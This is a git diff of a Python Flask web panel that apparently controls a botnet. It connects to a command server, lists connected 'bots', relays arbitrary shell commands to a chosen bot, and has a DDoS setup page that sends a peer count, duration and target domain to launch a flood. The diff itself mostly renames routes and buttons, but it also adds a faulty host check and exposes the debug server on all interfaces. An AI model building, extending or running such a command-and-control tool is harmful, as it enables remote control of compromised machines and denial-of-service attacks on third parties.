@@ -14,18 +14,17 @@ insert_err = 'Check if ip and port are correct'
 @app.route('/')
 def home():
     if not session.get('logged_in'):
-        return redirect(url_for('access'))
+        return redirect(url_for('login'))
     else:
         return redirect(url_for('main_activity'))
  
-@app.route('/access', methods=['GET','POST'])
-def access():
+@app.route('/login', methods=['GET','POST'])
+def login():
     if request.method == 'POST':
-        global connection_error
         server_ip = request.form.get('server_ip')
         server_port = request.form.get('server_port')
         if not server_ip or not server_port or int(server_port) not in range(1,65535):
-            return render_template('access.html', error = insert_err)
+            return render_template('login.html', error = insert_err)
         #Try enstablish connection to the server
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,12 +36,12 @@ def access():
             return redirect(url_for('main_activity'))
         except socket.timeout as err:
             print('[DEBUG] Timeout error | reason: %s' %(err))
-            return render_template('access.html', error = connection_err)
+            return render_template('login.html', error = connection_err)
         except error as serr:
-            return render_template('access.html', error = connection_err)
+            return render_template('login.html', error = connection_err)
 
     if request.method == 'GET':
-        return render_template('access.html')
+        return render_template('login.html')
 
 #This is the main activity page, it gets all bots connected to the main server
 @app.route('/main_activity', methods=['GET','POST'])
@@ -62,14 +61,10 @@ def main_activity():
         else:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
-            ip = session.get('ip')
-            port = session.get('port')
-            sock.connect((ip, port))
+            sock.connect((session.get('ip'), session.get('port')))
             try:
                 sock.send("*".encode('utf-8'))
-                data_b = sock.recv(4096)
-                data = data_b.decode('utf-8')
-                ip_data = data.split('*')
+                ip_data = connection.recvTimeout(sock, timeout=1).split('*')
                 session['cnt_peers'] = len(ip_data)
                 print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
                 return render_template('main_activity.html', ip_list = ip_data)
@@ -80,7 +75,7 @@ def main_activity():
 @app.route('/peer_activity/<ip>', methods=['GET','POST'])
 def peer_activity(ip):
     if request.method == 'POST':
-        if request.form['submit'] == 'SEND COMMAND':
+        if request.form['submit'] == 'Send':
             cmd = request.form.get('cmd_text')
             host = request.form.get("host")
             if cmd == '':
@@ -94,50 +89,44 @@ def peer_activity(ip):
             sock.send(srv_msg.encode('utf-8'))
             print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
             resp = connection.recvTimeout(sock)
-            #return render_template('peer_activity.html', ip = ip)
             sock.close()
             #TODO Check  resp format
-            #resp = resp.decode('utf-8')
-            #fin_resp = resp.replace('\n', '<br>')
             if resp:
                 print("[DEBUG] Response from Server: %s" %resp)
                 return render_template('peer_activity.html', ip = ip, cmd_response = resp)
             else:
-                return render_template('peer_activity.htmml', ip = ip)
+                return render_template('peer_activity.html', ip = ip)
 
-        elif request.form['submit'] == '<==':
+        elif request.form['submit'] == 'Back':
             return redirect(url_for('main_activity'))
 
     elif request.method == 'GET':
         if session.get('logged_in') == True:
             return render_template('peer_activity.html', ip = ip)
         else:
-            return redirect(url_for('access'))
+            return redirect(url_for('login'))
 
 #ddos_setup, setup for a ddos attack
 @app.route('/ddos_setup', methods=['GET','POST'])
 def ddos_setup():
     if request.method == 'POST':
-        if request.form['submit'] == 'START':
+        if request.form['submit'] == 'Start':
             n_peers = request.form.get('range')
             time = request.form.get('time')
             host = request.form.get('domain')
-            if 'http' in host:
+            if 'http' or 'https' in host:
                 host = host.split('/')[2]
             msg = '*'.join(['DDOS', n_peers, time, host])
-            ip = session.get('ip')
-            port = session.get('port')
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
+            sock.connect((session.get('ip'), session.get('port')))
             sock.send(msg.encode('utf-8'))
             return redirect(url_for('main_activity'))
 
-        elif request.form['submit'] == '<==':
+        elif request.form['submit'] == 'Back':
             return redirect(url_for('main_activity'))
 
     elif request.method == 'GET':
         cnt_peers = session.get('cnt_peers')
-        print(cnt_peers)
         if session.get('logged_in') == True:
             return render_template('ddos_setup.html', n_peers = cnt_peers)
         else: 
@@ -146,4 +135,4 @@ def ddos_setup():
 if __name__ == "__main__":
     app.secret_key = os.urandom(12)
     app.debug=True
-    app.run()
+    app.run('0.0.0.0')
